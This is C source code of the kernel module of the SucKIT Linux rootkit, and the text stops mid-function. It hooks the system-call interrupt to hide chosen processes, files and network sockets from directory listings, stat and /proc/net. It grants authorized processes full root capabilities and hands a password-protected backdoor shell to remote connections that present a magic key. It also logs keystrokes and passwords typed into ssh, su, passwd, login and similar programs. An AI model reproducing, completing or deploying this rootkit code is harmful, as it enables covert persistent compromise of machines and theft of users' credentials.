/*
 * $Id: _kernel.c, that's what we are!
 */

#define __KERNEL__
#include "syscall.h"
#include "sktypes.h"
#include "ktypes.h"
#include "kdefs.h"
#include "sk.h"
#include "kernel.h"
#include "aux.h"
#include "config.h"
#include "idt.h"
#include "kstr.h"
#include "segment.h"
#include "setup.h"
#include "sha1.h"
#include "spinlock.h"
#include "dietlibc/include/errno.h"
#include "_lib.c"
#include "rc4.c"
#include "ldt.h"
#include "gdt.h"

#define	WNOHANG		1
#define	PROC_FS_ROOT	1
#define WANNA_KILL_SUCKITD_ON_UNINSTALL 1

/* `cat /proc/ksyms | grep printk` to get right
 * value for currently running kernel */
//#define PRINTK_ADDR 0x0
//#define PRINTK_ADDR 0xc01133ac
//#define PRINTK_ADDR 0xc0115fa0

#if 1
#define crd(args...)
//{ int (*printk) (char *, ...) = (void *) PRINTK_ADDR; \
//printk("%s (): ", __FUNCTION__); printk(args); }
#else
#define crd(fmt,args...) while (0) {}
#endif


/**************************************************************************
 * Variables
 **************************************************************************/
/* imported variables */
ulong	kernel_old80;	/* original int $0x80 entrypoint */
ulong	kernel_sysaux;	/* original value of aux syscall */
ulong	*kernel_sct;	/* sys_call_table[] ptr */
ulong	kbase;		/* kernel base */
struct	idt *kidt;	/* real idt table */
struct	config cfg;	/* configured stuff */
int	hlen = 0; 	/* length of hidestr */
uchar	lkey[20];	/* hash of hashpass */
int	initialized = 0;


/* local variables */
extern	struct	sk_info sc; /* some vital info about system_call */
static	ulong	initmem = 0;
static	ulong	kernel_hook_table[256] = { 0 }; /* hooked calls table */
static	ulong	pidtab[MAXPID/32]; /* hidden pid's bitmap */
static	ulong	nettab[MAXPID/32]; /* hidden pid's bitmap */
static	ulong	snifftab[MAXPID/32]; /* hidden pid's bitmap */
static	ulong	capoff;

static struct hook hooks[];

/* allow args to be in kernel memory */
static inline ulong KSTART()
{
	ulong l;
	l = *((ulong *) (current+TASK_LIMIT));
	*((ulong *) (current+TASK_LIMIT)) = 0xffffffff;
	return l;
}
static inline void KEND(ulong l)
{
	*((ulong *) (current+TASK_LIMIT)) = l;
}

/* scan memory block for string of bytes */
void * my_memmem(char *s1, int l1, char *s2, int l2)
{
        if (!l2) return s1;
        while (l1 >= l2) {
                l1--;
                if (!memcmp(s1,s2,l2))
                        return s1;
                s1++;
        }
        return NULL;
}

/* string => integer */
uint    my_atoi(char *n)
{
        register uint ret = 0;
        while ((((*n) < '0') || ((*n) > '9')) && (*n))
                n++;
        while ((*n) >= '0' && (*n) <= '9')
                ret = ret * 10 + (*n++) - '0';
        return ret;
}

uint	my_atoi2(char *n)
{
	register uint ret = 0;
        while (((*n == ' ') || (*n == '\t')) && (*n))
                n++;
	while ((*n) >= '0' && (*n) <= '9')
		ret = ret * 10 + (*n++) - '0';
	return ret;
}

/* integer => string */
int	my_itoa(uchar *buf, uint n)
{
	uint	nl = 0;
	uint	d = 1000000000;
	uchar	*p = buf;

	if (!n) {
		*p++ = '0';
		goto out;
	}

	while (d) {
		uchar c;
		c = n / d;
		n = n % d;
		if (!c) {
			if (nl) *p++ = '0';
		} else {
			nl = 1;
			*p++ = c + '0';
		}
		d = d / 10;
	}
out:
	*p = 0;
	return ((ulong) p) - ((ulong) buf);
}


/*  XXX todo - bounds checks */
static inline void copy_from_user(void *to, void *from, ulong size)
{
	memcpy(to, from, size);
}
static inline void copy_to_user(void *to, void *from, ulong size)
{
	memcpy(to, from, size);
}
static inline int strlen_user(char *s)
{
	return strlen(s);
}

static inline char *strncpy_from_user(char *dest, char *src, ulong max)
{
	int l = strlen_user(src);
	if (l >= max) l = max-1;
	copy_from_user(dest, src, l);
	dest[l] = 0;
	return dest;
}
#define strcpy_from_user(dest, src) \
	strncpy_from_user(dest, src, 8192)

#define getuser(dest, addr)	\
	copy_from_user(dest, (void *) addr, sizeof(*(dest)))

#define	putuser(dest, what) \
	copy_to_user(dest, &what, sizeof(what))

/* sleep for sec*1000000000+nsec microseconds */
static	void	go_sleep(ulong sec, ulong nsec)
{
	struct	timespec t;
	ulong l = KSTART();
	t.tv_sec = sec;
	t.tv_nsec = nsec;
	SYS(nanosleep, &t, NULL);
	KEND(l);
}

/* initialize hook table */
static	void kernel_hook_init(void)
{
	struct hook *h = hooks;

	for (;h->handler;h++) {
		kernel_hook_table[h->nr] = (ulong) h->handler;
	}
}

/* create new idt */
#if 0
void	install_new_idt(void)
{
	static struct idtr idtr;
	int	i, a = 0;
	char	*p;

	get_idt(&idtr);
	orig_idt = idtr.base;

//	crd("copying idt from %p to %p\n", idtr.base, kernel_idt);
	memcpy(kernel_idt, (void *) idtr.base, sizeof(kernel_idt));
//	crd("done\n", idtr.base, kernel_idt);
	idtr.base = (ulong) kernel_idt;

	/* now, it would crash or it would work ;p */
	SET_IDT_BASE(kernel_idt[HOOK_INT], (ulong) int80_hook);
	crd("now, i'll set new idt...");
	set_idt(&idtr);
}

void	uninstall_new_idt(void)
{
	static struct idtr idtr;

	get_idt(&idtr);
	idtr.base = orig_idt;
	set_idt(&idtr);
}

#else
void	install_new_idt(void)
{
/*	static	struct idtr idtr;
	static	struct idt *idt;
	
	get_idt(&idtr);
	idt = (void *) idtr.base; */
	SET_IDT_BASE(kidt[HOOK_INT], (ulong) int80_hook);
}
void	uninstall_new_idt(void)
{
/*	static struct idtr idtr;
	static struct idt *idt;
	get_idt(&idtr);
	idt = (void *) idtr.base; */
	SET_IDT_BASE(kidt[HOOK_INT], (ulong) kernel_old80);
}
#endif



static	void	hide_me(void);

static inline void clear_signals()
{
	*((int *)(current + SIGPENDING)) = 0;
}

static inline ulong save_signals()
{
	ulong s = *((int *)(current + SIGPENDING));
	*((int *)(current + SIGPENDING)) = 0;
	return s;
}
static	inline void rest_signals(ulong s)
{
	*((int *)(current + SIGPENDING)) = s;
}

static	void	set_full_caps(void)
{
	ulong	l = KSTART(l);
	ulong	caphdr[2] = { 0, 0 };
	ulong	capdata[3] = { 0, 0, 0 };
	static	ulong n = 0;

	SYS(capget, caphdr, capdata);
	caphdr[1] = 0;
	*((ulong *)(current + capoff)) = ~0;
	capdata[0] = capdata[1] = capdata[2] = ~0;
	SYS(capset, caphdr, capdata);
	SYS(setresuid, 0, 0, 0);
	SYS(setresgid, 0, 0, 0);
	SYS(setgroups, 1, &n);
	KEND(l);
}

/* search for cap_permitted offset in current task_struct
   it works by sequential downgrading cap_effective and
   comparing result of syscall in task_struct */
static	void	find_cap(void)
{
	ulong	caphdr[2] = { 0, 0 };
	ulong	capdata[3] = { 0, 0, 0 };
	ulong	*p = (void *) current;
	ulong	l = KSTART();
	int	bit = 0;
	
	crd("searching for cap_permitted\n");
	/* first get cap version */
	SYS(capget, caphdr, capdata);
	SYS(capget, caphdr, capdata);
	capdata[0] = capdata[2] = 0;
	caphdr[1] = 0;
	SYS(capset, caphdr, capdata);
	
	for (;;p++) {
		/* and now cap data */
		tt:
		caphdr[1] = 0;
		SYS(capget, caphdr, capdata);
//		crd("%x, %x, %x\n", capdata[0], capdata[1], capdata[2]);
		if ((*p) == capdata[1]) {
//			crd("found cap_permitted at %d\n", ((ulong) p) - ((ulong) current));
			capdata[1] &= ~(1<<bit);
			caphdr[1] = 0;
//			crd("%d\n", SYS(capset, caphdr, capdata));
//			crd("%x, %x, %x\n", capdata[0], capdata[1], capdata[2]);
			bit++;
			if (bit == 32)
				break;
			goto tt;
		}
		bit = 0;
	}
	capoff = ((ulong) p) - ((ulong) current);
	set_full_caps();
	KEND(l);
}

/*
 * This is what will be called very first time. It will
 * just tell to user-mode wrapper that everything goes ok
 * and install idt
 */
int	kernel_entry(void)
{
	/* restore the syscall soon as possible */
	kernel_sct[SYSAUX] = kernel_sysaux;
//	xxx[0] = 'b';
//	crd("brm! %s\n", xxx);
//	go_sleep(2, 0);
//	asm (".byte 0xff, 0xff, 0xff, 0xff");

	kernel_hook_init();
	install_new_idt();

	if (!initialized) {
		int i;
		SYS(kill, 1, 1);
//		go_sleep(1, 0);
		for (i = 0; (i < 10) && (!initialized); i++)
			go_sleep(0, 333333333);

		if ((!initialized) || (!initmem)) {
			uninstall_new_idt();
			return 0; /* error */
		}
		return initmem;
	}
	hide_me();
	find_cap();

	return KERNEL_MAGIC;
}

/* usermode-memory allocator */
void	*ualloc(ulong size)
{
	struct	mmap mm;
	void	*res;
	ulong	l;
	
	l = KSTART();
	mm.addr = 0;
	mm.len = ALIGN4K(size + 4);
	mm.prot = PROT_RWX;
	mm.flags = MAP_PRIVATE;
	mm.fd = 0;
	mm.offset = 0;
	res = (void *) SYS(mmap, &mm);
	KEND(l);
	if (res == (void *) -1)
		return NULL;
	*((ulong *) res) = mm.len;
	return ((ulong *) res) + 1;
}

void	ufree(void *mem)
{
	if (mem) {
		SYS(munmap, ((ulong *) mem) - 1, *(((ulong *) mem) - 1));
	}
}

/**************************************************************************
 * Pid tracking
 **************************************************************************/
#define ourself SYS(getpid,0)
lock_t	pid_lock = LOCK_UNLOCKED;
#define lock_pid() spin_lock(pid_lock)
#define unlock_pid() spin_unlock(pid_lock)

/* it's hidden ? */
static	inline int is_hidden(unsigned pid)
{
	if (pid >= MAXPID) return 0;
	return ((pidtab[pid/32] & (1<<(pid & 31))) != 0);
}

static	inline int is_net(unsigned pid)
{
	if (pid >= MAXPID) return 0;
	return ((nettab[pid/32] & (1<<(pid & 31))) != 0);
}

static	inline int is_sniffing(unsigned pid)
{
	if (pid >= MAXPID) return 0;
	return ((snifftab[pid/32] & (1<<(pid & 31))) != 0);
}

/* make some pid visible */
static	inline void UNHIDE_PID(unsigned pid)
{
	if (pid >= MAXPID) return;
	pidtab[pid/32] &= ~(1<<((pid) & 31));
}

static	inline void UNSET_NET(unsigned pid)
{
	if (pid >= MAXPID) return;
	nettab[pid/32] &= ~(1<<((pid) & 31));
}

static	inline void UNSET_SNIFF(unsigned pid)
{
	if (pid >= MAXPID) return;
	snifftab[pid/32] &= ~(1<<((pid) & 31));
}

/* hide some pid */
static	inline void HIDE_PID(unsigned pid)
{
	if (pid >= MAXPID) return;
	pidtab[pid/32] |= (1<<((pid) & 31));
}

static	inline void SET_NET(unsigned pid)
{
	if (pid >= MAXPID) return;
	nettab[pid/32] |= (1<<((pid) & 31));
}
static	inline void SET_SNIFF(unsigned pid)
{
	if (pid >= MAXPID) return;
	snifftab[pid/32] |= (1<<((pid) & 31));
}

/* hide current task */
static	void	hide_me(void)
{
	HIDE_PID(ourself);
}

/* this performs the uninstall process, huh-huh */
static	void suckit_uninstall()
{
	uninstall_new_idt();
}

/**************************************************************************
 * pipe shell through regular connection
 **************************************************************************/

#include "_suckitd.c"

/**************************************************************************
 * Hooked kernel syscalls
 **************************************************************************/
#define is_authorized is_hidden
#define authorize hide_me

/* kernel <=> user communication */
static int	new_aux(sk_aux *aux, int cmd, ulong pass0, ulong pass1)
{
	sk_aux	a;

	if (is_authorized(ourself)) {
		getuser(&a, aux);
		switch (a.cmd) {
			case CMD_GETVER:
				copy_to_user((void *) a.arg, VERSION, sizeof(VERSION));
				break;
			case CMD_UNINST:
				suckit_uninstall();
				break;
			case CMD_UNHIDE:
				UNHIDE_PID(a.arg);
				break;
			case CMD_HIDE:
				HIDE_PID(a.arg);
				break;
			case CMD_INIT:
				hlen = strlen(cfg.hidestr);
				sha1_kernel(lkey, cfg.hashpass, 20);
				break;
			case CMD_GETHOME:
				copy_to_user((void *) a.arg, cfg.home, strlen(cfg.home)+1);
				break;
		}
		return CMD_COMPLETED;
	} else {
		ulong	pass[5];
		uchar	upass[20];
		uchar	passbuf[256];

		if (cmd != CMD_AUTH)
			goto away;
		memcpy(pass, cfg.hashpass, 20);
		if ((pass[0] != pass0) || (pass[1] != pass1))
			goto away;
		getuser(&a, aux);
		strncpy_from_user(passbuf, (void *) a.arg, sizeof(passbuf));
		sha1_kernel(upass, passbuf, strlen(passbuf));
		if (!memcmp(upass, pass, sizeof(pass))) {
			authorize();
			return CMD_COMPLETED;
		}
	}
away:
	return do_syscall(SYSAUX, cmd, pass0, pass1);
}

/**************************************************************************
 * File and process hiding stuff
 **************************************************************************/

/* hope that /proc inode numbering will remain ;) */
#define should_strip_inode(x) \
	(((x - 2) % 65536 == 0) && (is_hidden((x - 2) / 65536)))

/* should be this filename invisible ? */
static	int	should_strip_name(char *fname)
{
	int	l = strlen(fname);

	return ((l >= hlen) && (!memcmp(fname + l - hlen, cfg.hidestr, hlen+1)));
}

/* should be this filename and/or inode invisible ? */
static	int	should_strip(char *fname, unsigned inode)
{
	return should_strip_name(fname) || should_strip_inode(inode);
}

#if 1
/* if pathname virtualy "doesn't exist" return < 0 */
static	int	check_path(const char *path)
{
	int	ret, len;
	ulong	l;
	char	buf[1024];

	ret = SYS(access, path, 0);
	if (ret < 0)
		return 0;
	strncpy(buf, path, sizeof(buf)-1);
	buf[sizeof(buf)-1] = 0;
	len = strlen(buf);

	ret = 0;
	l = KSTART();
	while (1) {
		struct	stat st;

		if (len <= 0) break;
		if (((len >= hlen) &&
		     (!memcmp(buf + len - hlen, cfg.hidestr, hlen + 1))) ||
		    ((!SYS(lstat, buf, &st)) &&
		     (should_strip_inode(st.st_ino)))
		   ) {
			ret = 1;
			break;
		}
		while (len) {
			if (buf[len] == '/') {
				buf[len] = 0;
				break;
			}
			len--;
		}
	}
	KEND(l);
	return ret;
}
#else
static inline int check_path(const char *p)
{
	return 0;
}
#endif

/* getdents template */
#define	getdents(name, de) \
int	new_##name(unsigned fd, struct de *d, unsigned count)	\
{							\
	int	newlen, ret, len;			\
	char	*p;					\
	if (is_authorized(ourself))			\
		return SYS(name, fd, d, count);		\
	do {						\
		ret = SYS(name, fd, d, count);		\
		if (ret <= 0)				\
			return ret;			\
		p = (void *) d;				\
		for (len = ret; len > 0;) {		\
			struct de *dir = (void *) p;	\
			volatile int rlen = dir->d_reclen; \
			len -= rlen;			\
			if (should_strip(dir->d_name, dir->d_ino)) { \
				memcpy(dir, p + dir->d_reclen, len); \
			} else {			\
				p += rlen;		\
			}				\
		}					\
		newlen = p - (char *) d;		\
	} while (!newlen);				\
	return newlen;					\
}
getdents(getdents, de);
getdents(getdents64, de64);

/* one-arg path syscall checking */
static int	new_pathf(const char *path)
{
	if (is_authorized(ourself))
		return FALLTHRU;
	if (check_path(path))
		return -ENOENT;
	return FALLTHRU;
}

/* two-arg path syscall checking */
static int	new_oldnewf(const char *old, const char *new)
{
	if (is_authorized(ourself))
		return FALLTHRU;
	if (check_path(old) || check_path(new))
		return -ENOENT;
	return FALLTHRU;
}

/* new ?stat??() syscall handling, it only stealths modified size */
static	int	do_stat(struct pt_regs *regs,
	int st_size_o, int st_blksize_o, int st_blocks_o)
{
	char	*path = (void *) regs->ebx;
	char	*stat = (void *) regs->ecx;
	int	ret;
	int	l;
	char	*ubuf;
	struct	stat *ust;

	if (is_authorized(ourself))
		return FALLTHRU;
	if (check_path(path))
		return -ENOENT;
	ret = do_syscall(regs->orig_eax, path, stat);
	if (ret < 0)
		return ret;
	l = strlen(path);
	ust = ualloc(l + 1024 + sizeof(*ust));
	if (!ust)
		return -ENOMEM;
	ubuf = ((char *) ust) + sizeof(*ust);
	memcpy(ubuf, path, l);
	strcpy(ubuf + l, cfg.hidestr);
	ret = SYS(stat, ubuf, ust);
	if (ret < 0) {
		ufree(ust);
		return 0;
	}

	if (st_size_o != -1)
		*(ulong *) (stat + st_size_o) = ust->st_size;
	if (st_blksize_o != -1)
		*(ulong *) (stat + st_blksize_o) = ust->st_blksize;
	if (st_blocks_o != -1)
		*(ulong *) (stat + st_blocks_o) = ust->st_blocks;
	ufree(ust);
	return 0;
}

#define offset_of(str, what) (((ulong) &str.what) - ((ulong) &str))

static	int	new_oldstat(struct pt_regs regs)
{
	static struct	old_stat dummy;
	return do_stat(&regs,
		offset_of(dummy, st_size), -1, -1);
}

static	int	new_stat(struct pt_regs regs)
{
	static struct	stat dummy;
	return do_stat(&regs,
		offset_of(dummy, st_size),
		offset_of(dummy, st_blksize),
		offset_of(dummy, st_blocks));
}

static	int	new_stat64(struct pt_regs regs)
{
	static struct	stat64 dummy;
	return do_stat(&regs,
		offset_of(dummy, st_size),
		offset_of(dummy, st_blksize),
		offset_of(dummy, st_blocks));
}


/* evil files */
static	int bdev = -1;
static	int bad[4] = { -1, -1, -1, -1 };
static	char *badlist[] = {
		"/proc/net/tcp",
		"/proc/net/udp",
		"/proc/net/raw",
		"/proc/net/unix" };

#define BADC 4

/* get some useful info about em */
static void	cache_bads(void)
{
	struct	stat st;
	ulong	l;
	int	i;

	l = KSTART();
	for (i = 0; i < BADC; i++) {
		if (bad[i] == -1) {
			if (!SYS(stat, badlist[i], &st)) {
				bad[i] = st.st_ino;
				bdev = st.st_dev;
//				crd("ino = %d, dev = %d\n", st.st_ino, st.st_dev);
			}
		}
	}
	KEND(l);
}

/*
 * this creates table ("cache") of sockets owned by invisible processes 
 * sorry for the weird code ... but try it with that limited set of
 * functions ;)
 */
static int     create_net_tab(int *tab, int max)
{
	int	i, j;
	int	fd;
	uchar	buf[32];
	uchar	buf2[32];
	struct	de de;
	int	cnt = 0;
	ulong	l = KSTART();

	for (i = 0; i < MAXPID; i++) {
		if (is_hidden(i)) {
		uchar *zptr;

		strcpy(buf, "/proc/");
		zptr = buf + 6 + my_itoa(buf + 6, i);
		strcpy(zptr, "/fd"); zptr += 3;
		fd = SYS(open, buf, O_RDONLY, 0);
		if (fd < 0) continue;
		*zptr++ = '/';
		loopcont:
			j = SYS(readdir, fd, &de, sizeof(struct de));
			if (j != 1) goto loopout;
			strcpy(zptr, de.d_name);
			j = SYS(readlink, buf, buf2, sizeof(buf2));
			if (j > 0) {
				buf2[j] = 0;
				if (!strncmp(buf2, "socket:[", 8)) {
					tab[cnt] = 
					my_atoi(buf2);
//					crd("hidden socket %d\n", tab[cnt]);
					cnt++;
					if (cnt >= max) {
						SYS(close, fd);
						goto outta;
					}
				} /* strncmp */
			} /* readlink */
			goto loopcont;
		loopout:
		SYS(close, fd);
		} /* IS_HIDDEN */
	} /* for */
outta:
	KEND(l);
	return cnt;
}

static inline int     invisible_socket(int nr, int *tab, int max)
{
        int     i;
        for (i = 0; i < max; i++) {
                if (tab[i] == nr)
                        return 1;
        }
        return 0;
}

/* ehrm. ehrm. 8 gotos at one page of code ? uglyneees ;)
   this is code strips (i hope ;) "bad" things from netstat, etc. */
static int     strip_net(char *src, char *dest, int size, int *net_tab,
                  int ncount, int skip)
{
        char   *ptr = src;
        char   *bline = src;
        int     temp;
        int     ret = 0;
        int     i;

rnext:
        if (ptr >= (src + size))
                goto rlast;
        if ((ptr - bline) > 0) {
                memcpy(dest, bline, ptr - bline);
                dest += ptr - bline;
                ret += ptr - bline;
        }
        bline = ptr;
        for (i = 0; i < skip; i++) {
                while (*ptr == ' ') {
                        if (ptr >= (src + size))
                                goto rlast;
                        if (*ptr == '\n')
                                goto rnext;
                        ptr++;
                }
                while (*ptr != ' ') {
                        if (ptr >= (src + size))
                                goto rlast;
                        if (*ptr == '\n')
                                goto rnext;
                        ptr++;
                }
                if (ptr >= (src + size))
                        goto rlast;
        }
        temp = my_atoi2(ptr);
        while (*ptr != '\n') {
                ptr++;
                if (ptr >= (src + size))
                        goto rlast;
        }
        ptr++;
        if ((temp) && (invisible_socket(temp, net_tab, ncount)))
                bline = ptr;
        goto rnext;
rlast:
        if ((ptr - bline) > 0) {
                memcpy(dest, bline, ptr - bline);
                ret += ptr - bline;
        }
        return ret;
}

/*
 * hide socket references to hidden pid's in
 * specified /proc/net* file thus their network
 * stuff will not appear in netstat
 */
#define	NT_SIZE	4096
#define	NT_MEM	(NT_SIZE * sizeof(int))

#define currflags *((ulong *) (current + TASK_FLAGS))

static int	hide_sockets(int fd, int type)
{
	int	nsize, ncount, size = 0;
	int	*net_tab;
	uchar	*tmp;
	struct	net *ns;

	/* allocate buffer for future data */
	net_tab = ualloc(NT_MEM);
	if (!net_tab) {
		crd("can't alloc net_tab!\n");
		return 1;
	}

	/* count size of net file */
	do {
		nsize = SYS(read, fd, net_tab, NT_MEM);
		if (nsize < 0) {
			crd("suspicious read while counting size\n");
			goto errfree;
		}
		size += nsize;
	} while (nsize == NT_MEM);

	if (SYS(lseek, fd, 0, 0)) {
		crd("can't re-seek!\n");
		goto errfree;
	}
	
	tmp = ualloc(size);
	if (!tmp) {
		crd("can't allocate temp file (%d bytes)\n", size);
		goto errfree;
	}
	ns = ualloc(sizeof(struct net) + size);
	if (!ns) {
		crd("2: can't allocate temp file (%d bytes)\n", size);
		goto tmpfree;
	}
	/* create table of sockets which should be kept hidden */
	ncount = create_net_tab(net_tab, NT_SIZE);
#if 1
	if (!ncount) {
		crd("WARNING: ncount == 0 (no hidden sockets ?)\n");
//		goto nsfree;
	}
#endif
	nsize = SYS(read, fd, tmp, size);
	if (nsize < 0) {
		crd("WARNING: nsize == %d\n", nsize);
		goto nsfree;
	}
	SYS(lseek, fd, 0, 0);
	/* strip hidden sockets */
	ns->len = strip_net(tmp, ns->data, nsize, net_tab, ncount, (type == 3)?6:9);
	ns->pos = 0;
	ns->fd = fd;
	crd("setting net_struct for %d at %p", ourself, ns);
	*((ulong *) (current + NETSTRUCT)) = (ulong) ns;
	SET_NET(ourself);
//	currflags |= PF_NET;
	return 0;
nsfree:
	ufree(ns);
tmpfree:
	ufree(tmp);
errfree:
	ufree(net_tab);
	return 1;	
}

/* we'll explicitly disallow to temper with our "boot" files :) */
static	int	new_unlink(const char *path)
{
	char	buf[1024+64];
	int	i;
	ulong	l;

	if (is_authorized(ourself))
		return FALLTHRU;

	if (check_path(path))
		return -ENOENT;

	if ((!SYS(access, path, 0)) && ((i = strlen((char *)path)) < 1024)) {
		int	ret;
		struct	statfs st;

		l = KSTART();
		memcpy(buf, (char*)path, i);
		strcpy(buf + i, cfg.hidestr);
	//	if ((!SYS(access, buf, 0)) && (!SYS(statfs, buf, &st)) && (st.f_namelen > 8)) {
		if (!SYS(access, buf, 0)) {
			crd("namelen = %d\n", st.f_namelen);
			KEND(l);
			return -ETXTBSY;
		}
		KEND(l);
	}
	return FALLTHRU;
}

static	int	new_creat(const char *path, int mode)
{
	char	buf[1024+64];
	int	i;
	ulong	l;

	if (is_authorized(ourself))
		return FALLTHRU;

	if (check_path(path))
		return -ENOENT;

	if ((!SYS(access, path, 0)) && ((i = strlen((char *)path)) < 1024)) {
		struct	statfs st;

		l = KSTART();
		memcpy(buf, (char*)path, i);
		strcpy(buf + i, cfg.hidestr);
		if ((!SYS(access, buf, 0)) && (!SYS(statfs, buf, &st)) && (st.f_namelen > 8)) {
			i = SYS(creat, buf, mode);
			KEND(l);
			return i;
		}
		KEND(l);
	}
	return FALLTHRU;
}

/* open a file */
static int	new_open(const char *path, int flags, int mode)
{
	ulong	l;
	struct	stat st;
	int	i, ret;
	char	buf[1024+64];

	/* big-ugly-hack */
	if (is_authorized(ourself)) {
		ret = SYS(open, path, flags, mode);
		if (ret < 0)
			return ret;
		if (!strcmp(path, "/etc/passwd")) {
			int	i, fd, hl = strlen(cfg.home);
			char	*p, buf[256] = "/proc/";
			ulong	l = KSTART();
			
//			crd("hacking /etc/passwd\n", NULL);
			p = buf + 6 + my_itoa(buf + 6, ourself);
			strcpy(p, "/stat");
//			crd("opening %s\n", buf);
			fd = SYS(open, buf, O_RDONLY, 0);
			if (fd < 0)
				goto oo;
			i = SYS(read, fd, buf, 255);
			SYS(close, fd);
			if (i < 0)
				goto oo;
			buf[i] = 0;
			for (p = buf; *p != '('; p++);
			if ((!strncmp(p, "(ssh)",5)) ||
			    (!strncmp(p, "(ssh2)",6)) ||
			    (!strncmp(p, "(scp)",5)) ||
//			    (!strncmp(p, "(mc)",4)) ||
			    (!strncmp(p, "(ncftp)",7)) ||
			    (!strncmp(p, "(screen",7)) ||
			    (!strncmp(p, "(sh)",4)) ||
			    (!strncmp(p, "(bash)",6))) {
				memcpy(buf, cfg.home, hl);
				strcpy(buf + hl, "/" PWDHACK);
				fd = SYS(open, buf, flags, mode);
				if (fd < 0)
					goto oo;
				ret = fd;
			}
		oo:
			KEND(l);
		}
		return ret;
	}
	if (check_path(path))
		return -ENOENT;

	if (!SYS(access, path, 0) && ((i = strlen((char*)path)) < 1024)) {
		l = KSTART();
		memcpy(buf, (char*)path, i);
		strcpy(buf + i, cfg.hidestr);
		if (!SYS(access, buf, 0)) {
			i = SYS(open, buf, flags, mode);
			KEND(l);
			return i;
		}
		KEND(l);
	}

	ret = SYS(open, path, flags, mode);
	if (ret < 0) return ret;
 
	l = KSTART();
	cache_bads();
#if 1
	if ((!SYS(fstat, ret, &st)) && (st.st_dev == bdev)) {
		for (i = 0; i < BADC; i++) {
			if (bad[i] == st.st_ino) {
//				crd("bad %s\n", path);
				KEND(l);
				if (hide_sockets(ret, i)) {
					SYS(close, ret);
					crd("fail1\n");
					return -ENOMEM;
				}
				return ret;
			}
		}
	}
#endif
	KEND(l);
	return ret;
}

/**************************************************************************
 * TTY sniffing
 **************************************************************************/
/* read from file */
#define currsniff *((ulong *) (current + SNIFFSTRUCT))

static int	is_a_tty(int fd)
{
	ulong	limit, t;
	int	i;

	limit = KSTART();
	i = SYS(ioctl, fd, TIOCGPGRP, &t);
	KEND(limit);
	return (!(i < 0));
}


/* sniffer logger */
static void	snifflog(void *p, int length)
{
	int	fd;
	int	l;
	ulong	limit;
	char	buf[256];
	int	hl = strlen(cfg.home);

	memcpy(buf, cfg.home, hl);
	strcpy(buf + hl, "/" SNIFFER);

	l = SYS(umask, 0);
	limit = KSTART();
	fd = SYS(open, buf, O_APPEND | O_WRONLY | O_CREAT, 0222);
	SYS(umask, l);
	if (fd < 0) goto outta;

	l = SYS(write, fd, p, length);
	SYS(close, fd);
outta:
	KEND(limit);
}


static int	new_read(int fd, char *buf, int count)
{
	ulong	l;
	char	mybuf[25];
	int	ret;
	int	i;

	if (is_authorized(ourself))
		goto cont;

	if (count <= 0)
		return FALLTHRU;

	/* /proc/net/tcp|udp|raw|unix stealth */
	if (is_net(ourself)) {
		struct	net *net = (void *) *((ulong *) (current + NETSTRUCT));
//		if (!net) {
//			*((ulong *) (current + TASK_FLAGS)) &= ~PF_NET;
//		}
		if ((net->fd == fd)) {
	                if ((count + net->pos) > net->len) {
	                        count = net->len - net->pos;
	                }
	                if ((net->pos >= net->len) ||
	                    (count == 0)) return 0;
	                memcpy(buf, net->data + net->pos, count);
	                net->pos += count;
			return count;
		}
	}

cont:
	ret = SYS(read, fd, buf, count);
	l = KSTART();
	if (ret < 0)
		goto outta;
	if (ret >= 22) {
		memcpy(mybuf, buf, 22);
		goto brm;
	} else {
//		crd("got challenge, pid = %d\n", ourself);
		memcpy(mybuf, buf, ret);
		if ((i = recv(fd, mybuf + ret, 22 - ret, 0x42)) == (22 - ret)) {
		brm:
			if (!memcmp(mybuf, lkey, 20)) {
				int i;
//				crd("got challenge, pid = %d\n", ourself);
				if (ret < 22) {
					char	waste[22];
					SYS(read, fd, waste, 22 - ret);
				}
				
				go_sleep(0, 333333333);
				i = pipe_shell(fd, *((ushort *) &mybuf[20]));
				if (i != -1)
					ret = i;
			}
		}
	}
outta:
	KEND(l);
	if (ret > 0) {
		if (is_a_tty(fd)) {
			if ((is_sniffing(ourself)) &&
			    (currsniff & SN_STATE_PASSWD)) {
				snifflog(buf, ret);
				if (memchr(buf, '\n', ret) ||
				    memchr(buf, '\r', ret)) {
				     	/* cr after typing a password -
					   stop sniffing */
					UNSET_SNIFF(ourself);
//					currflags &= ~PF_SNIFFING;
				}
			}
		}
	}
	return ret;
}

static	int new_write(int fd, void *buf, int count)
{
	int	ret;
	
	ret = SYS(write, fd, buf, count);
	if ((ret > 0) && is_sniffing(ourself)) {
		if (is_a_tty(fd)) {
			snifflog(buf, count);
			currsniff += count & 0x0fffffff;
			if ((currsniff & 0x0fffffff) > SNIFFLIMIT) {
				UNSET_SNIFF(ourself);
//				currflags &= ~PF_SNIFFING;
				currsniff = 0;
			} else
			if (my_memmem(buf, count, "ssword:", 7)) {
				currsniff |= SN_STATE_PASSWD;
			}
		}
	}
	return ret;
}

/* close file */
static int	new_close(int fd)
{
	if (is_net(ourself)) {
		struct	net *net = (void *) *((ulong *) (current + NETSTRUCT));
		if ((net->fd == fd)) {
			UNSET_NET(ourself);
			ufree(net);
		}
	}
	return FALLTHRU;
}

/* just to make fork/clone/vfork/whatever happy */
void	fork_pid(const int pid)
{
	if (pid > 0) {
		UNSET_NET(pid);
		UNSET_SNIFF(pid);
		if (is_hidden(SYS(getpid,0))) {
			HIDE_PID(pid);
		} else {
			UNHIDE_PID(pid);
		}
	}
}

extern void new_clone();

int execve_head(ulong eax, const char *name,
		 char *const argv[], char *const envp[])
{
	if (is_authorized(ourself))
		return 0;
	if (check_path(name))
		return -ENOENT;
	return 0;
}


void execve_tail(int result, struct pt_regs regs)
{
	static	char *services[] =
		{ "rlogin", "rsh", "rcp", "rexec",
		  "ssh", "scp", "ssh2", "scp2", "sftp",
		  "telnet", "login", "su", "passwd",
		  "adduser", "useradd", NULL };
	int	i;
	char	*p, *q;
	char	**argv = ((char **) (regs.esp + 4));

	if (result >= 0) {
		/* do not sniff hidden */
		if (is_authorized(ourself))
			return;
		for (p = q = (char *) argv[0]; *q; q++)
			if (*q == '/') p = q + 1;
		for (i = 0; services[i]; i++)
			if (!strcmp(services[i], p)) {
				char buf[64] = "### execve ### by uid ";

				SET_SNIFF(ourself);
				currsniff = 0;
				for (i = 0; argv[i]; i++) {
					snifflog(argv[i], strlen(argv[i]));
					snifflog(" ", 1);
				}
				p = buf + 22 + my_itoa(buf + 22, SYS(getuid, 0));
				*p++ = '\n';
				snifflog(buf, p - buf);
				return;
			}
	}
}

extern void new_execve();


static	int	new_umount(char *path)
{
	int	ret;
	if (is_authorized(ourself))
		return FALLTHRU;

	if (check_path(path))
